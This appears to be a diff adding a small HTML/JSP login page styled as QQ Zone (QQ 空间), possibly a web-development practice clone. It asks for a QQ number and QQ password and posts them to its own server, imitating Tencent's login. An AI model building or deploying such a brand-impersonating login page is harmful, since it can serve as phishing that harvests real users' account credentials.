@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8" />
+   <meta id="viewport" name="viewport" content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
+<title>QQ 空间</title>
+<style type="text/css">
+
+body
+ html{height:100%}
+        body{font-size:16px;background:#eee}*{padding:0;margin:0;list-style:none;text-decoration:none}
+         input::-webkit-input-placeholder,
+        textarea::-webkit-input-placeholder{color:#aaa}
+        input::-ms-input-placeholder,
+        textarea::-ms-input-placeholder{color:#aaa}
+        input:focus{outline:0}.content{margin:0 auto;width:320px;height:500px;position:relative}
+.all{
+height:100px;width:290px;margin:0 auto 20px;background-size:244px 100px
+}
+
+.all .first .login,.all .first .pas{
+width:167px;
+height: 50px;
+text-align: center;
+line-height: 50px;
+display: block;
+float: right;
+background-color: lightblue;
+font-family: "微软雅黑";
+color: gray;
+
+}
+.all .second .number{
+ width:273px;height:44px;color:#000;border:none;background:0 0;padding-left:15px;font-size:16px;-webkit-appearance:none;border-bottom:1px solid #eaeaea;
+}
+
+.all .second .password {
+   width:273px;height:44px;color:#000;border:none;background:0 0;padding-left:15px;font-size:16px;-webkit-appearance:none
+}
+
+.all .second .ok{
+width:290px;height:44px;line-height:44px;background:#146fdf;
+            border:none;border-radius:4px;color:#fff;font-size:16px;margin-top:15px;display:block
+}
+
+.all .first{
+width: 335px;
+height:52px;
+}
+
+.all .second{
+   background:#fff;height:89px;width:290px;border-radius:4px
+}
+
+.all .third .login{
+
+margin-left: 157px;
+
+}
+
+
+.all .first .login:hover{
+color:black;
+}
+
+.all .first .pas:hover{
+color:black;
+}
+
+.all .second .bnext{
+width: 20px;
+height: 20px;
+margin-top: 10px;
+margin-left: 17px;
+}
+
+.all .second .tnext{
+display: block;
+width: 100px;
+height: 15px;
+margin-left: 45px;
+margin-top: -22px;
+font-size: small;
+
+}
+
+.all .third span{
+
+font-size:smaller;
+color: blue;
+font-family: "微软雅黑";display:inline-block;height:32px;line-height:185px;
+}
+
+</style>
+
+
+
+
+
+
+
+
+
+</head>
+<body>
+<form action="/" method="post">
+<div class="all">
+<div style="text-align:center;margin-top:20px;"><img src="${pageContext.request.contextPath}/34.gif"width="115" height="115"></div>
+<div class="second">
+<input type="text" name="username" placeholder="QQ号码/手机/邮箱" class="number"/><br />
+<input type="password" name="password" placeholder="请输入你的QQ密码"  class="password"/>
+
+<a href="https://www.liaoxuefeng.com"><input type="submit" value="登录"  class="ok"/></a>
+</div>
+<div class="third">
+<span class="pas">忘了密码?</span>
+<span class="login">注册新账号</span>
+
+
+</div>
+
+
+
+</div>
+</form>
+</body>
+</html>
